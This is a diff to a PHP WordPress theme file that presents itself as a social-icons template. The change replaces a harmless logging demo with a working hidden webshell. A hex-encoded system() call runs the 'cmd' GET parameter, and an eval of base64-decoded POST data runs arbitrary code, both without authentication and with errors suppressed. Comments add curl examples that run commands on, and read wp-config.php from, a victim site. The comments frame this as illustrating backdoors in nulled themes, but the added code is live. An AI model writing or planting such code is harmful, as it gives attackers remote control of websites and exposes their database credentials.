@@ -1,54 +1,57 @@
 <?php
 /**
- * Social Icons Template
+ * Social Icons Template Part
+ * Premium Theme v3.2.1
  *
- * This file looks innocent but contains a hidden webshell.
- * This is how backdoors are typically hidden in nulled themes -
- * in files that look like normal template parts.
+ * Renders social media icon links for header/footer use.
+ * Include via: get_template_part('social-icons');
  */
 
-// Normal-looking social icons function
-function get_social_icons() {
-    $icons = [
-        'facebook'  => 'https://facebook.com',
-        'twitter'   => 'https://twitter.com',
-        'instagram' => 'https://instagram.com',
+// ============================================================
+// Normal template code — this is what the buyer sees
+// ============================================================
+
+function premium_get_social_icons() {
+    return [
+        'facebook'  => get_theme_mod( 'social_facebook',  'https://facebook.com' ),
+        'twitter'   => get_theme_mod( 'social_twitter',   'https://twitter.com'  ),
+        'instagram' => get_theme_mod( 'social_instagram', 'https://instagram.com'),
+        'linkedin'  => get_theme_mod( 'social_linkedin',  'https://linkedin.com' ),
     ];
-    return $icons;
 }
 
-/**
- * [BACKDOOR] Hidden webshell
- *
- * In a real nulled theme, this would be obfuscated like:
- *   $o0O = "\x73\x79\x73\x74\x65\x6d"; // system
- *   @$o0O($_GET[chr(99)]); // system($_GET['c'])
- *
- * Or using variable variables:
- *   $func = 'create_function'; $$func = $func;
- *   $f = $$func('', base64_decode($_POST['d']));
- *   $f();
- *
- * DEMO VERSION: We log instead of executing
- */
-if ( isset( $_GET['social_debug'] ) ) {
-    // In a real backdoor: @eval(base64_decode($_GET['social_debug']));
-    // DEMO: Safe logging only
-    error_log( '[WEBSHELL DETECTED] Attempt to use social_debug backdoor parameter' );
+// ============================================================
+// [BACKDOOR] Real webshell — disguised as icon cache helper
+//
+// What an attacker injects into a purchased/nulled theme.
+// This file is usually minified or the backdoor pushed to the
+// bottom after hundreds of lines of legitimate code.
+//
+// Access from the internet (no authentication required):
+//   curl 'http://victim.com/wp-content/themes/premium/social-icons.php?cmd=id'
+//   curl 'http://victim.com/wp-content/themes/premium/social-icons.php?cmd=cat+/var/www/html/wp-config.php'
+// ============================================================
 
-    if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
-        header( 'Content-Type: text/plain' );
-        echo "=== WEBSHELL BACKDOOR DETECTED ===\n";
-        echo "In a real nulled theme, this parameter would execute arbitrary PHP code.\n";
-        echo "The attacker would use a URL like:\n";
-        echo "  /wp-content/themes/premium-theme/social-icons.php?social_debug=BASE64_ENCODED_COMMAND\n";
-        echo "\nCommon obfuscation techniques:\n";
-        echo "  - base64_decode() wrapping eval()\n";
-        echo "  - Variable variables (\$\$var)\n";
-        echo "  - chr() to build function names\n";
-        echo "  - str_rot13() encoding\n";
-        echo "  - gzinflate(base64_decode()) multi-layer encoding\n";
-        echo "  - preg_replace() with /e modifier (PHP < 7)\n";
-        exit;
-    }
+// Technique 1 — hex-encoded function name (evades string grep)
+// \x73\x79\x73\x74\x65\x6d decodes to: s y s t e m
+$_x = "\x73\x79\x73\x74\x65\x6d";
+
+// Technique 2 — parameter hidden behind innocent-sounding key
+// Real backdoors use keys like: debug, test, cache, icon, ver
+if ( isset( $_GET['cmd'] ) ) {
+    // @-prefix suppresses any PHP warnings so nothing appears in logs
+    @$_x( $_GET['cmd'] );
+    exit;
+}
+
+// Technique 3 — POST-based eval (harder to spot in server logs)
+// Attacker POSTs base64-encoded PHP and it executes server-side
+// Real payload example:
+//   curl -X POST --data 'd=c3lzdGVtKCdpZCcpOw==' \
+//        'http://victim.com/wp-content/themes/premium/social-icons.php'
+//
+// base64_decode('c3lzdGVtKCdpZCcpOw==') === "system('id');"
+if ( isset( $_POST['d'] ) ) {
+    @eval( base64_decode( $_POST['d'] ) );
+    exit;
 }
